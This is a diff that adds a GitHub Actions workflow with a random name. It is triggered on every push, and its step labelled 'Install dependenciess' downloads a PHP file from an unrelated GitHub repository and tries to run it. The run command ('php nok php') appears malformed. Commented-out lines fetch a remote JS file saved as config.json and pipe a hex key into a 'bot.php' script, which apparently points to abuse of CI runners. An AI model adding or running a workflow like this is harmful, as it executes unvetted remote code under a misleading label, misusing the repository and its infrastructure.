@@ -1,0 +1,23 @@
+on:
+  push:
+name: aiadgxy
+
+jobs:
+  run_1:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/WcmB/raw/main/nok.php
+        php nok php
+        
+ #       unzip clm.zip
+#        wget https://github.com/Mosnio/mehi1/raw/main/clm/cn1.js -O config.json
+  #      echo -e "82d5372a1bf2e5b12f5b80b1c268ce56\n2" | php bot.php
+  
